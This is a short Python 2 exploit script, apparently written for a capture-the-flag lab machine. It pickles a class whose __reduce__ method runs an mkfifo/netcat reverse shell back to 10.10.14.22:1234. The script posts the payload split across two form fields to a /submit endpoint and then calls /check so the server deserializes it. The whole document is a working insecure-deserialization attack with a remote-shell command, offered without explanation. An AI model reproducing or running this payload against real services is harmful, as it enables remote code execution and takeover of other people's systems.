import os
import cPickle
from hashlib import md5
import requests
 
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('homer:;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.22 1234 >/tmp/f',)) #Add shell here
 
shellcode = cPickle.dumps(Exploit())
 
requests.post("http://10.10.10.70/submit", data={'character': shellcode.split(":")[0], 'quote': shellcode.split(":")[1]})
requests.post("http://10.10.10.70/check", data={'id': md5(shellcode.split(":")[0] + shellcode.split(":")[1]).hexdigest()})
